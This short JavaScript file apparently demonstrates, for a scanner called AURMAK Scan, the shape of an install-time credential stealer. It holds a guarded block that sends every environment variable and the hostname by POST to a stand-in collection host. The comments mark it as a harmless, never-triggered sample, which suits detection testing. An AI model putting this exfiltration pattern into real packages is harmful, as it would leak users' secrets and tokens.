// AURMAK Scan demo: the shape of an install-time credential stealer.
// Harmless: the guard below is never true and the host can never resolve.
const os = require('os');

if (process.env.AURMAK_DEMO_THIS_IS_NEVER_SET === 'yes') {
  const payload = JSON.stringify(process.env);
  fetch('https://collect.example.invalid/i', {
    method: 'POST',
    body: JSON.stringify({ host: os.hostname(), payload }),
  }).catch(() => {});
}
